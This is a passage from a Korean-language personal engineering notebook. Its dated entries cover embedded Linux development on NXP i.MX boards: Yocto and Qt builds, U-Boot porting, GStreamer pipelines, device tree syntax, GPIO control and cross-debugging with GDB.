               echo " You might need to modify the include and library search paths by editing"
               echo " QMAKE_INCDIR and QMAKE_LIBDIR in"
               echo " ${XQMAKESPEC}."
        #	exit 1
    	fi
        fi
    done
    ```
5.  configure 실행  
    
    ```text
    ./configure -embedded arm -host-little-endian -little-endian -release
    -nomake examples -nomake docs -no-gtkstyle -no-stl -no-script -no-libmng
    -no-dbus -no-largefile -no-webkit -no-cups -no-libtiff -no-openssl
    -qt-gfx-linuxfb -xplatform qws/linux-arm-gnueabi-g++ -qt-mouse-tslib
    -I /opt/imx28/tslib/include -L /opt/imx28/tslib/lib -opensource
    -confirm-license -no-phonon -qt-gfx-transformed -prefix /opt/imx28/qt
    ```
6.  빌드  
    
    ```text
    $ make
    $ make install
    ```


### <span class="section-num">3.97</span> Yocto Guide {#yocto-guide}


#### <span class="section-num">3.97.1</span> List MACHINE {#list-machine}

-   imx6qpsabreauto
-   imx6qpsabresd
-   imx6ulevk
-   imx6dlsabreauto
-   imx6dlsabresd
-   imx6qsabreauto
-   imx6qsabresd
-   imx6slevk
-   imx6solosabreauto
-   imx6solosabresd
-   imx6sxsabresd
-   imx6sxsabreauto
-   imx7dsabresd


#### <span class="section-num">3.97.2</span> List DISTRO {#list-distro}

Graphic Backend를 무엇으로 할지 결정  


#### <span class="section-num">3.97.3</span> List Image {#list-image}

build 할 이미지 결정  


### <span class="section-num">3.98</span> Yocto imx6 {#yocto-imx6}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-07-25 월 17:48&gt;</span></span>  
NXP fsl-yocto-L3.14.52-1.1.0-ga 빌드  

1.  BUILD Host Tools  
    
    ```text
    $ sudo apt-get install gawk wget git-core diffstat unzip texinfo gcc-multilib \
    build-essential chrpath  socat  libsdl1.2-dev
    $ sudo apt-get install libsdl1.2-dev xterm  sed cvs subversion coreutils texi2html \
    docbook-utils python-pysqlite2 help2man make gcc g++ desktop-file-utils \
    libgl1-mesa-dev libglu1-mesa-dev mercurial autoconf automake groff curl lzop \
    asciidoc u-boot-tools
    ```
2.  repo init and sync  
    
    ```text
    $ mkdir fsl-release-bsp; cd fsl-release-bsp
    $ repo init -u git://git.freescale.com/imx/fsl-arm-yocto-bsp.git -b imx-3.14.52-1.1.0_ga
    $ repo sync
    ```
3.  Build Config  
    
    ```text
    $ shopt -u dotglob
    $ DISTRO=fsl-imx-fb MACHINE=imx6qsabresd source fsl-setup-release.sh -b build-fb
    ```
4.  UBoot Config  
    1.  Edit conf/local.conf  
        
        ```text
        $ $ echo "UBOOT_CONFIG = \"emmc\"" >> conf/local.conf
        ```
    2.  deploy  
        
        ```text
        $ MACHINE=imx6qsabresd bitbake -c deploy u-boot-imx
        ```
5.  Build Image  
    
    ```text
    $ bitbake fsl-image-qt5
    ```
6.  Build qt5 toolchain for crosscompile  
    
    ```text
    $ bitbake meta-toolchain-qt5
    $ sudo sh tmp/deploy/sdk/fsl-imx-x11-glibc-x86_64-meta-toolchain-qt5-cortexa9hf-vfp-neon-toolchain-4.1.15-1.2.0.sh
    ```


### <span class="section-num">3.99</span> 하드디스크 복제 {#하드디스크-복제}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-10 수 19:35&gt;</span></span>  

```text
$ sudo dd if=/dev/sdX of=/dev/sdY bs=64K conv=noerror,sync
```


### <span class="section-num">3.100</span> Mfgtools 용 커널및 부트로더 빌드 {#mfgtools-용-커널및-부트로더-빌드}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-10 수 19:44&gt;</span></span>  


#### <span class="section-num">3.100.1</span> LTIB 버전 {#ltib-버전}

1.  config/platform/imx/imx6q\_updater.cf 파일 설정  
    
    ```text
    CONFIG_PKG_U_BOOT_CONFIG_TYPE="mx6q_sabresd_mfg_config"
    CONFIG_BOARD_MX6Q_SABRESD=y
    ```
2.  rootfs 에 custom 파일들이 많다면 제거하고최소한의 사이즈로 유지한다.
3.  uboot/include/configs/mx6q\_sabresd\_mfg.h 파일에서  
    CONFIG\_SYS\_FSL\_USDHC\_NUM 을 3으로 변경

4.  kernel/drivers/mmc/mmc.c 에서 ext\_csd.rev > 8 로 변경

5.  run ltib command  
    
    ```text
    $ ./ltib --profile config/platform/imx/updater.profile --preconfig \
    config/platform/imx/ imx6q_updater.cf --continue --batch
    ```
6.  copy initramfs.cpio.gz.uboot under ltib root dir  
    copy uboot.bin uImage under rootfs/boot/

7.  제대로 동작하지 않는다면 uboot 와 커널만 따로 mfgtools용  
    config 설정을 하고 다시 빌드하여 추가해 본다.  
    실제로 나는 이렇게 하고 동작했다.


#### <span class="section-num">3.100.2</span> Yocto 버전 {#yocto-버전}

1.  CONFIG\_MFG\_ENV\_SETTINGS 에 mfgtools\_args 가 정의 되어 있다.  
    custom u-boot 파일을 mfgtools 의 firmware 디렉토리에복사하여 사용하면 된다.
2.  커널의 경우 mfgtools 용의 configs 파일을 사용하여 따로 빌드한다.  
    
    ```text
    $ make imx_v7_mfg_defconfig 
    ```
3.  initramfs 는 mfgtools 에 있는 파일을 그대로 사용해도 동작하였다.


### <span class="section-num">3.101</span> NXP U-BOOT Porting {#nxp-u-boot-porting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-11 목 20:52&gt;</span></span>  
nxp linux L4.1.15\_1.2.0-ga bsp 의 uboot 포팅 가이드이다.  

1.  uboot 디렉토리로 이동  
    
    ```text
    $ cd $BUILD_ROOT
    $ cd tmp/work/imx6qsabresd-poky-linux-gnueabi/u-boot-imx/2015.04-r0/git
    ```
2.  레퍼런스 defconfig 복사및 수정  
    
    ```text
    $ cp configs/mx6qsabresd_defconfig configs/mx6_ahn_defconfig
    $ cat configs/mx6_ahn_defconfig
    CONFIG_SYS_EXTRA_OPTIONS="IMX_CONFIG=board/freescale/mx6_ahn/mx6q_ahn.cfg,MX6Q,SYS_USE_SPINOR"
    CONFIG_ARM=y
    CONFIG_TARGET_MX6_AHN=y
    CONFIG_DM=y
    CONFIG_DM_THERMAL=y
    ```

3.  레퍼런스 헤드 복사  
    
    ```text
    $ cp include/configs/mx6sabresd.h include/configs/mx6_ahn.h
    $ cp include/configs/mx6sabre_common.h include/configs/mx6_ahn_common.h
    ```

4.  레퍼런스 보드 디레토리 복사  
    
    ```text
    $ cp -R board/freescale/mx6sabresd board/freescale/mx6_ahn
    ```
5.  레퍼런스 파일 복사및 설정 변경  
    
    ```text
    $ cd board/freescale/mx6_ahn
    $ cp mx6sabresd.c mx6_ahn.c
    ```
6.  Edit Makefile  
    
    ```text
    obj-y := mx6_ahn.o
    ```

7.  Edit Kconfig  
    
    ```text
    if TARGET_MX6_AHN
    
    config SYS_BOARD
         default "mx6_ahn"
    
    config SYS_VENDOR
         default "freescale"
    
    config SYS_SOC
         default "mx6"
    
    config SYS_CONFIG_NAME
         default "mx6_ahn"
    
    endif
    ```
8.  Edit arch/arm/Kconfig  
    
    ```text
    config TARGET_MX6_AHN
         bool "Support mx6_ahn"
         select CPU_V7
         select SUPPORT_SPL
    
    source "board/freescale/mx6_ahn/Kconfig"
    ```
9.  make build script  
    
    ```text
    export ARCH=arm
    export CROSS_COMPILE=/home/ybgwon/Work/Freescale/MX6/LINUX/Yocto/L4.1.15_1.2.0-ga/fsl-release-bsp/bld-fb/tmp/sysroots/x86_64-linux/usr/bin/arm-poky-linux-gnueabi/arm-poky-linux-gnueabi-
    export PATH=/home/ybgwon/Work/Freescale/MX6/LINUX/Yocto/L4.1.15_1.2.0-ga/fsl-release-bsp/bld-fb/tmp/sysroots/x86_64-linux/usr/bin/arm-poky-linux-gnueabi:$PATH
    make distclean
    make mx6_ahn_config
    make CC="arm-poky-linux-gnueabi-gcc --sysroot=/home/ybgwon/Work/Freescale/MX6/LINUX/Yocto/L4.1.15_1.2.0-ga/fsl-release-bsp/bld-fb/tmp/sysroots/imx6qsabresd"
    ```


### <span class="section-num">3.102</span> kermit 전송 {#kermit-전송}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-12 금 21:43&gt;</span></span>  
minicom에서 kermit 전송을 해야할 때가 있다. uboot 에서 kermit을이용하여 kernel 이나 ramdisk 등을 전송하기 위한 방법이다.  

1.  kermit 패키지가 없다면 ckermit 패키지를 설치한다.  
    
    ```text
    $ sudo apt-get install ckermit
    ```
2.  kermit rc 파일을 작성한다.  
    
    ```text
    $ cat > ~/.kermrc
    set carrier-watch off
    set handshake none
    set flow-control none
    robust
    set file type bin
    set rec pack 1000
    set send pack 1000
    set window 5
    ```
3.  minicom uboot 창에서  
    
    ```text
    EB # loadb 30800000
    ```
4.  minicom send file  
    
    ```text
    C-a z -> s(sendfiles) -> kermit 선택 ->
    goto -> 전송 파일 디렉토리 -> 전송 파일 스페이스로 선택 ->
    okay
    ```


#### <span class="section-num">3.102.1</span> 링크 {#링크}

<http://ben-collins.blogspot.kr/2011/06/setting-up-minicom-and-ckermit-for-u.html>  


### <span class="section-num">3.103</span> linux kernel config show hidden option {#linux-kernel-config-show-hidden-option}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-26 금 16:38&gt;</span></span>  
linux kernel config 시 숨겨진 옵션을 볼려면 z 단축키를 누르면 된다.  


### <span class="section-num">3.104</span> IMX6 Multimedia {#imx6-multimedia}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-26 금 17:18&gt;</span></span>  


#### <span class="section-num">3.104.1</span> set enviromment {#set-enviromment}

```text
export GSTL=gst-launch-1.0
export PLAYBIN=playbin
export GPLAY=gplay-1.0
export GSTINSPECT=gst-inspect-1.0
```


#### <span class="section-num">3.104.2</span> Audio Only {#audio-only}

-   format  
    
    ```text
    $GSTL filesrc location=$clip_name [typefind=true] ! [$id3parse] ! queue 
    ! $audio_parser_plugins ! $audio_decoder_plugin ! $audio_sink_plugin
    ```
-   example (mp3)  
    
    ```text
    $GSTL filesrc location=test.mp3 ! id3demux ! queue ! mpegaudioparse ! beepdec ! pulsesink
    ```


#### <span class="section-num">3.104.3</span> Video Only {#video-only}

-   format  
    
    ```text
    $GSTL filesrc location=test.video typefind=true ! $capsfilter ! $demuxer_plugin 
    ! queue max-size-time=0 ! $video_decoder_plugin ! $video_sink_plugin
    ```
-   example (mp4)  
    
    ```text
    $GSTL filesrc location=test.mp4 typefind=true ! video/quicktime ! aiurdemux ! queue max-size-time=0 ! vpudec ! overlaysink      
    ```


#### <span class="section-num">3.104.4</span> Audio/Video {#audio-video}

-   format  
    
    ```text
    $GSTL filesrc location=test_file typefind=true ! $capsfilter 
       ! $demuxer_plugin name=demux demux. 
       ! queue max-size-buffers=0 max-size-time=0 ! $video_decoder_plugin 
       ! $video_sink_plugin demux. 
       ! queue max-size-buffers=0 max-size-time=0 ! $audio_decoder_plugin 
       ! $audio_sink_plugin       
    ```
-   Other Methods  
    
    ```text
    $GSTL $PLAYBIN uri=file:///mnt/sdcard/test.avi
    $GPLAY /mnt/sdcard/test.avi       
    ```


#### <span class="section-num">3.104.5</span> Video Recording {#video-recording}

-   format  
    
    ```text
    $GSTL imxv4l2src device=$DEVICE num-buffers=300 ! $INPUT_CAPS ! queue ! vpuenc_h264
      ! $ $MUXER ! filesink location=output.$EXTENSION
    ```
    
    -   $DEVICE could be set to /dev/video, /dev/video0, or /dev/video1
    -   $INPUT\_CAPS should be set to  
        'video/x-raw,format=(string)NV12,width=1920,height=1080,framerate=(fraction)30/1'
    -   $MUXER can be set as to qtmux, matroskamux, mp4mux, avimux, or flvmux
    -   $EXTENSION is filename extension according to the muxer type
-   set environment  
    
    ```text
    export DEVICE=/dev/video0
    export INPUT_CAPS='video/x-raw,format=(string)NV12,width=1920,height=1080,framerate=(fraction)30/1'
    export MUXER=mp4mux
    export EXTENSION=mp4
    ```


#### <span class="section-num">3.104.6</span> Camera Preview {#camera-preview}

I.MX7D UVCDEVICE 에서 프리뷰가 되지 않은 현상은 format을 YUY2로지정하지 않아서이다.  

-   format  
    
    ```text
    $GSTL imxv4l2src ! 'video/x-raw, format=(string)$FORMAT, 
       width=$WIDTH, height=$HEIGHT, framerate=(fraction)30/1' 
       ! imxv4l2sink
    ```
-   example  
    
    ```text
    $GSTL imxv4l2src device=/dev/video2 ! 'video/x-raw,format=(string)YUY2,width=640,height=480,framerate=(fraction)30/1' ! imxv4l2sink
    ```
    
    또는  
    
    ```text
    $ gst-launch-1.0 imxv4l2src device=/dev/video1 ! imxv4l2sink
    ```


#### <span class="section-num">3.104.7</span> Camera Snapshot {#camera-snapshot}

```text
$ gst-launch-1.0 imxv4l2src device=/dev/video2 num-buffers=1 ! 'video/x-raw,format=(string)YUY2,width=(int)1600,height=(int)1200,framerate=(fraction)30/1' ! jpegenc ! filesink location=/tmp/test.jpg
```

<http://www.variwiki.com/index.php?title=IMX%5FCSI>  


### <span class="section-num">3.105</span> Gstreamer Video Streaming {#gstreamer-video-streaming}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-07 월 15:36&gt;</span></span>  


#### <span class="section-num">3.105.1</span> camera input -> x264 encoder -> network {#camera-input-x264-encoder-network}

1.   sender

    ```text
    gst-launch-1.0 v4l2src ! \
     video/x-raw,width=640,height=480 ! \
     x264enc ! h264parse ! rtph264pay ! \
     udpsink host=127.0.0.1 port=5000
    ```

2.   receiver

    ```text
    gst-launch-1.0 udpsrc port=5000 ! \
     application/x-rtp,\
     encoding-name=H264,payload=96 ! \
     rtph264depay ! h264parse ! avdec_h264 ! \
     autovideosink
    ```
    
    위 command 는 느리다. parameter를 tweak 하면아래와 같다.  
    
    ```text
    gst-launch-1.0 v4l2src ! \
     video/x-raw,width=640,height=480 ! \
     x264enc tune=zerolatency byte-stream=true \
     bitrate=3000 threads=2 ! \
     h264parse config-interval=1 ! \
     rtph264pay ! udpsink host=127.0.0.1 port=5000
    ```


#### <span class="section-num">3.105.2</span> camera input -> jpec encoder -> local and network {#camera-input-jpec-encoder-local-and-network}

1.   sender

    ```text
    gst-launch-1.0 v4l2src ! \
     video/x-raw,width=640,height=480 ! \
     timeoverlay ! \
     tee name="local" ! \
     queue ! \
     autovideosink local. ! \
     queue ! jpegenc ! rtpjpegpay ! \
     udpsink host=127.0.0.1 port= 5000
    ```

2.   receiver

    ```text
    gst-launch-1.0 udpsrc port=5000 ! \
     application/x-rtp,\
     encoding-name=JPEG,payload=26 ! \
     rtpjpegdepay ! jpegdec ! autovideosink
    ```


#### <span class="section-num">3.105.3</span> 링크 {#링크}

<http://www.z25.org/static/%5Frd%5F/videostreaming%5Fintro%5Fplab/>  


### <span class="section-num">3.106</span> gstreamer rotate play {#gstreamer-rotate-play}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-05-31 수 17:12&gt;</span></span>  

```text
$ gst-launch-1.0 playbin uri=file:///mnt/nfs/video/13.OST-Stay-With-Me.mp4 \
video-sink="video/x-raw, width=1920, heght=1080 ! imxvideoconvert_g2d rotate=3 \
! video/x-raw, width=1080, height=607 ! ximagesink display=:0 sync=true"
```


### <span class="section-num">3.107</span> gstreamer debug {#gstreamer-debug}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-11-04 금 18:02&gt;</span></span>  

1.  help  
    
    ```text
    $ gst-launch --gst-debug-help
    ```
2.  vervose output  
    
    ```text
    $ gst-launch-1.0 playbin uri=file:///test.avi -v
    ```
3.  특정 element 지정  
    audiotestsrc 에 대하여만 4 level debug  
    
    ```text
    $ gst-launch --gst-debug=audiotestsrc:4   audiotestsrc ! alsasink
    ```
4.  여러 elements 지정  
    
    ```text
    $ gst-launch --gst-debug=audio*:4   audiotestsrc ! alsasink
    ```
5.  모든 elements 지정  
    level을 4 이상하면 사실 너무 output 이 많아서보기 힘들다.  
    
    ```text
    $ gst-launch --gst-debug=*:5   audiotestsrc ! alsasink
    ```
6.  링크  
    <http://labs.isee.biz/index.php/Example%5FGStreamer%5FPipelines#Debugging>  
    <https://developer.ridgerun.com/wiki/index.php/GStreamer%5FDebugging>


### <span class="section-num">3.108</span> imx6 hdmi boot {#imx6-hdmi-boot}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-29 월 11:43&gt;</span></span>  

```text
=> setenv mmcroot '/dev/mmcblk2p2 rootwait rw video=mxcfb0:dev=hdmi,1920x1080M@60,if=RGB24'
```


### <span class="section-num">3.109</span> Display mode 변경 {#display-mode-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-30 화 21:01&gt;</span></span>  

```text
$ export DISPLAY=:0
$ xrandr
root@imx6q-tinyrex:~# xrandr
Screen 0: minimum 240 x 240, current 1280 x 720, maximum 8192 x 8192
DISP3 BG connected 1280x720+0+0 (normal left inverted right x axis y axis) 0mm x 0mm
   S:1920x1080p-30  30.00
   S:1920x1080p-25  25.00
   S:1920x1080p-24  24.00
   S:1280x720p-50  50.00
   S:1280x720p-60  60.00*
   D:1280x720p-60  60.00
   S:720x576p-50  50.00
   S:720x480p-60  59.94
   V:640x480p-60  59.94
root@imx6q-tinyrex:~#
$ xrandr --output "DISP3 BG" --mode S:1280x720p-60
```


### <span class="section-num">3.110</span> bitbake {#bitbake}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-08-31 수 20:16&gt;</span></span>  


#### <span class="section-num">3.110.1</span> Toolchain 빌드하기 {#toolchain-빌드하기}

1.  설치  
    
    ```text
    $ bitbake meta-toolchain
    $ sh \
    tmp/deploy/sdk/poky-glibc-x86_64-meta-toolchain-cortexa9hf-vfp-neon-toolchain-1.7.sh
    ```
2.  설치후 사용 환경설정  
    
    ```text
    $ source /opt/poky/1.7/environment-setup-cortexa9hf-vfp-neon-poky-linux-gnueabi
    ```


#### <span class="section-num">3.110.2</span> Kernel 재빌드 {#kernel-재빌드}

```text
$ bitbake -c compile linux-imx -f -v
```


#### <span class="section-num">3.110.3</span> 배포용 이미지 빌드 {#배포용-이미지-빌드}

```text
$ bitbake -c deploy linux-imx -f -v
```


### <span class="section-num">3.111</span> How to recompile just a single kernel module {#how-to-recompile-just-a-single-kernel-module}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-09-02 금 15:55&gt;</span></span>  

```text
$ make modules SUBDIRS=drivers/the_module_directory
$ make modules_install SUBDIRS=drivers/the_module_directory
```

or  

```text
$ make drivers/media/platform/mxc/capture/adv7612.ko
```

<http://stackoverflow.com/questions/8744087/how-to-recompile-just-a-single-kernel-module>  


### <span class="section-num">3.112</span> firefox,emacs cache 관련 {#firefox-emacs-cache-관련}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-09-05 월 15:20&gt;</span></span>  

1.  부팅후 ~/bin 아래 firefox-sync, emacs2ram 스크립트를 실행하여

enable 한다.  

1.  crontab 에서 주기적으로 실행한다.

<https://wiki.archlinux.org/index.php/Firefox%5Fon%5FRAM>  
<http://blog.binchen.org/posts/emacs-speed-up-1000.html>  


### <span class="section-num">3.113</span> 외부 모듈 빌드용 Makefile {#외부-모듈-빌드용-makefile}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-09-09 금 03:04&gt;</span></span>  

```text
ifneq ($(KERNELRELEASE),)

# kbuild part of makefile

obj-m  := 8123.o

8123-y := 8123_if.o 8123_pci.o 8123_bin.o

else

# Normal Makefile

KERNELDIR := /lib/modules/`uname -r`/build

all::

$(MAKE) -C $(KERNELDIR) M=`pwd` $@


# Module specific targets

genbin:

echo “X” > 8123_bin.o_shipped

endif
```

<http://koroke.tistory.com/20>  
See KERNEL/Documentation/modules.txt  


### <span class="section-num">3.114</span> Performance Tunning {#performance-tunning}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-05 수 01:41&gt;</span></span>  

1.  Enable Weekly Trim  
    
    ```text
    $ sudo cp /usr/share/doc/util-linux/examples/fstrim.{service,timer} /etc/systemd/system
    $ sudo systemctl enable fstrim.timer
    ```
    
    fstab 설정은 문제가 ssd 따라 문제가 있을 수 있다.  
    noatime 옵션은 설정않음 (커널 2.6.30 부터 relatime default)  
    man mount
2.  /etc/lvm/lvm.conf 수정  
    
    ```text
    issue_discards = 1
    ```
3.  add vm.swapniss /etc/sysctl.d/local.conf  
    
    ```text
    vm.swappiness=1
    ```
4.  Change Default Scheduler  
    /etc/udev/rules.d/60-ssd-scheduler.rules  
    
    ```text
    # set deadline scheduler for non-rotating disks
    ACTION=="add|change", KERNEL=="sd[a-z]", ATTR{queue/rotational}=="0", ATTR{queue/scheduler}="deadline"
    ```
    
    archlinux 에서는 noop 설정 권장

<https://wiki.debian.org/SSDOptimization>  
<https://wiki.archlinux.org/index.php/Improving%5Fperformance>  


### <span class="section-num">3.115</span> Device Tree {#device-tree}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-06 목 23:15&gt;</span></span>  


#### <span class="section-num">3.115.1</span> 기본 형식 {#기본-형식}

```text
/ {
	node1 {
		a-string-property = "A string";
		a-string-list-property = "first string", "second string";
		a-byte-data-property = [0x01 0x23 0x34 0x56];
		child-node1 {
			first-child-property;
			second-child-property = <1>;
			a-string-property = "Hello, world";
		};
		child-node2 {
		};
	};
	node2 {
		an-empty-property;
		a-cell-property = <1 2 3 4>; /* each number (cell) is a uint32 */
		child-node1 {
		};
	};
};
```

1.  "/" 는 디바이스 트리에 표현하고 싶은 전체 장치의 최상위 루트 노드라는 의미
2.  속성은 키 = 값으로 이루어진다.  
    문자열은 "string", 32bit 부호없는 정수형은 <>, 이진 데이터는 [] 로표시한다. , 는 속성값을 혼합할 때나 문자열을 나열할 때 사용할 수 있다.
3.  compatible 속성은 운영체제에서 동작하는 디바이스 드라이버가 다룰디바이스에 대한 정보를 찾기 위한 키 값이다.  
    "<제조사>,<모델>" 형식으로 표현해야 한다.


#### <span class="section-num">3.115.2</span> 디바이스 주소지정 {#디바이스-주소지정}

1.  \#address-cells 속성은 reg 속성 값에 시작 주소를 지정하기 위해서몇개의 셀을 사용할 것인가를 지정
2.  \#size-cells 속성은 reg 속성 값에 길이를 지정하기 위해서몇개의 셀을 사용할 것인가를 지정
3.  address-cells 과 size-cells 속성은 자식 노드에만 영향을 준다.

<!--listend-->

```text
/ {
	#address-cells = <1>;
	#size-cells = <1>;

	...

	serial@101f0000 {
		compatible = "arm,pl011";
		reg = <0x101f0000 0x1000 >;
	};

	serial@101f2000 {
		compatible = "arm,pl011";
		reg = <0x101f2000 0x1000 >;
	};

	gpio@101f3000 {
		compatible = "arm,pl061";
		reg = <0x101f3000 0x1000
			0x101f4000 0x0010>;
	};

	interrupt-controller@10140000 {
		compatible = "arm,pl190";
		reg = <0x10140000 0x1000 >;
	};

	spi@10115000 {
		compatible = "arm,pl022";
		reg = <0x10115000 0x1000 >;
	};

	...

};
```


#### <span class="section-num">3.115.3</span> 주소 번역(ranges 속성) {#주소-번역--ranges-속성}

```text
ranges = <
			자식주소1 부모주소1 자식주소크기1
			자식주소2 부모주소2 자식주소크기2
			자식주소3 부모주소3 자식주소크기3
			자식주소4 부모주소4 자식주소크기4
					: 
		>;
```

```text
/ {
	compatible = "acme,coyotes-revenge";
	#address-cells = <1>;  <--- ranges 속성 값에서 부모 주소 셀 수 지정
	#size-cells = <1>;
	...
	external-bus {
		#address-cells = <2> <-- ranges 속성 값에서 자식 주소 셀 수 지정
		#size-cells = <1>;	<-- ranges 속성 값에서 자식 주소 크기 셀 수 지정
		ranges = <0 0  0x10100000   0x10000     // Chipselect 1, Ethernet
		 	 1 0  0x10160000   0x10000     // Chipselect 2, i2c controller
			 2 0  0x30000000   0x1000000>; // Chipselect 3, NOR Flash
      ...
```

위 예제를 해석하면칩 셀렉트 0 번의 오프셋 0은 0x10100000..0x1010ffff 의 주소 범위로 맵핑됩니다.  
칩 셀렉트 1 번의 오프셋 0은 0x10160000..0x1016ffff 의 주소 범위로 맵핑됩니다.  
칩 셀렉트 2 번의 오프셋 0은 0x30000000..0x10000000 의 주소 범위로 맵핑됩니다.  


#### <span class="section-num">3.115.4</span> 인터럽트 처리 {#인터럽트-처리}

```text
/ {
	compatible = "acme,coyotes-revenge";
	#address-cells = <1>;
	#size-cells = <1>;
	interrupt-parent = <&intc>;

	serial@101f0000 {
		compatible = "arm,pl011";
		reg = <0x101f0000 0x1000 >;
		interrupts = < 1 0 >;
	};

	serial@101f2000 {
		compatible = "arm,pl011";
		reg = <0x101f2000 0x1000 >;
		interrupts = < 2 0 >;
	};

	gpio@101f3000 {
		compatible = "arm,pl061";
		reg = <0x101f3000 0x1000
			0x101f4000 0x0010>;
		interrupts = < 3 0 >;
	};

	intc: interrupt-controller@10140000 {
		compatible = "arm,pl190";
		reg = <0x10140000 0x1000 >;
		interrupt-controller;
		#interrupt-cells = <2>;
	};

	spi@10115000 {
		compatible = "arm,pl022";
		reg = <0x10115000 0x1000 >;
		interrupts = < 4 0 >;
	};

};
```

1.  interrupt-parent 속성 값은 시스템의 디폴트 인터럽트 컨트롤러를지정합니다.
2.  interrupt-cells 속성은 interrupts 속성에서 하나의 인터럽트에대한 기술을 하기 위한 셀 수를 지정합니다.  
    위 예에서 "#interrupt-cells" 은 2 입니다. 그래서 하나의 인터럽트입력을 표현하기 위해서는 2 개의 셀이 필요합니다. 이 예에서는인터럽트 라인 번호를 표현하기 위해서 첫번째 셀이 쓰입니다.  그리고두번째 셀은 액티브 되는 인터럽트 레벨의 조건이 레벨 하이인지로우인지 엣지인지를 나타냅니다.


#### <span class="section-num">3.115.5</span> 특수 노드들 {#특수-노드들}

1.  aliases 노드쉽게 긴이름을 짧은 이름으로 대치하게 하거나 일반적으로 알수 있는용어로 바꾸어 사용할 수 있도록 해준다  
    
    ```text
    aliases {
    		     ethernet0 = &eth0;
    		     serial0 = &serial0;
    	     };
    ```
    
    별명 = &라벨 형식
2.  choosen 노드부트 아큐먼트와 같은, 펌웨어에서 운영 체제에 전달된 데이터를파씽하기 위한 방법으로 제공  
    
    ```text
    chosen {
    		     bootargs = "root=/dev/nfs rw nfsroot=192.168.1.1 console=ttyS0,115200";
    	     };
    ```


#### <span class="section-num">3.115.6</span> Compile {#compile}

1.  dts to blob  
    
    ```text
    $ dtc -O dtb -o p4080ds.dtb p4080ds.dts
    ```
2.  blob to dts  
    
    ```text
    dtc -I dtb -O dts p4080ds.dtb
    ```
3.  freescale  
    freescale dts 파일은 제한적 devic tree 문법을 따르지 않으므로아래와 같이 변환하는 방식으로 하여야 한다.  
    
    ```text
    IDE=<your-device-name>
    SRC=$IDE.dts
    TMP=$IDE.tmp.dts
    DST=$IDE.dtb
    
    cpp -nostdinc -I include -undef -x assembler-with-cpp $SRC > $TMP
    dtc -O dtb -b 0 -o $DST $TMP
    rm $TMP
    ```


#### <span class="section-num">3.115.7</span> 링크 {#링크}

[falinux](http://forum.falinux.com/zbxe/index.php?%5Ffilter%3Dsearch&mid%3Dlecture%5Ftip&search%5Ftarget%3Duser%5Fname&search%5Fkeyword%3D%25EC%259C%25A0%25EC%2598%2581%25EC%25B0%25BD%2B&page%3D4&document%5Fsrl%3D784561)  
<https://community.nxp.com/thread/394569>  


### <span class="section-num">3.116</span> GPIO and Device Tree {#gpio-and-device-tree}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-11 화 11:49&gt;</span></span>  


#### <span class="section-num">3.116.1</span> gpio 를 sysfs 에서 제어 {#gpio-를-sysfs-에서-제어}

1.  dts 파일에 아래와 같이 기본값(0x80000000)의 pin 설정만 정의한다.  
    
    ```text
    MX6QDL_PAD_DISP0_DAT13__GPIO5_IO07  0x80000000
    ```
2.  export 할 gpio 숫자 계산  
    
    ```text
    (gpionum - 1) * 32 + IOnum = (5 - 1) * 32 + 7
    ```
3.  /sys/class/gpio 에서 export 한 다음 해당 디렉토리에서  
    direction, in, out 값에 적당한 값을 쓴다.  
    
    ```text
    $ cd /sys/class/gpio
    $ echo 135 > export; cd gpio135
    $ echo out > direction; echo 1 > out
    ```


#### <span class="section-num">3.116.2</span> 디바이스 트리에서 초기값 지정하기 {#디바이스-트리에서-초기값-지정하기}

==> 테스트 요망  

```text
&gpio1 {
	gpio-1 {
		gpio-hog;
		gpios = <5 7>;
		output-low;
	};
};
```


#### <span class="section-num">3.116.3</span> 커널 패치 적용후 device tree 에서 export {#커널-패치-적용후-device-tree-에서-export}

<http://www.spinics.net/lists/devicetree/msg08604.html>  


#### <span class="section-num">3.116.4</span> 정리하면 {#정리하면}

gpio export 패치가 왜 mainstream에 머지 되지 않았나 생각해 보았다.  
굳이 디바이스 트리에서 export 하지 않아도 부트 스크립트에서조정하는 것이 더 유연한 방법이 아닐까 생각한다.  


### <span class="section-num">3.117</span> Cross GDB {#cross-gdb}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2016-10-11 화 00:00&gt;</span></span>  


#### <span class="section-num">3.117.1</span> App Debug {#app-debug}

1.  target 보드에서 gdbserver 실행  
    
    ```text
    $ gdbserver :port app_to_debug
    $ gdbserver :1234 rtkinit
    ```
2.  host 에서 crossgdb 실행  
    
    ```text
    $ arm-poky-linux-gnueabi-gdb app_to_debug
    ```
    
    emacs gud를 이용하려면 full path를 적어준다.  
    
    ```text
    M-x gdb
    /opt/fsl-imx-fb/4.1.15-1.2.0/sysroots/x86_64-pokysdk-linux/usr/bin/arm-poky-linux-gnueabi/arm-poky-linux-gnueabi-gdb -i=mi rtkinit
    ```
3.  solib-search-path 를 지정한다.  
    
    ```text
    set solib-search-path /opt/fsl-imx-fb/4.1.15-1.2.0/sysroots/cortexa9hf-vfp-neon-poky-linux-gnueabi/lib
    ```
4.  remote gdb 서버에 접속  
    
    ```text
    target remote <target-IP>:<port>
    $ target remote 192.168.0.211:1234
    ```


#### <span class="section-num">3.117.2</span> Kernel Debug {#kernel-debug}

1.  kgdb 커널 옵션  
    
    ```text
    Kernel Hacking
    CONFIG_HAVE_ARCH_KGDB=y
    CONFIG_KGDB=y
    CONFIG_KGDB_SERIAL_CONSOLE=y
    General Setup
    CONFIG_KALLSYMS=y
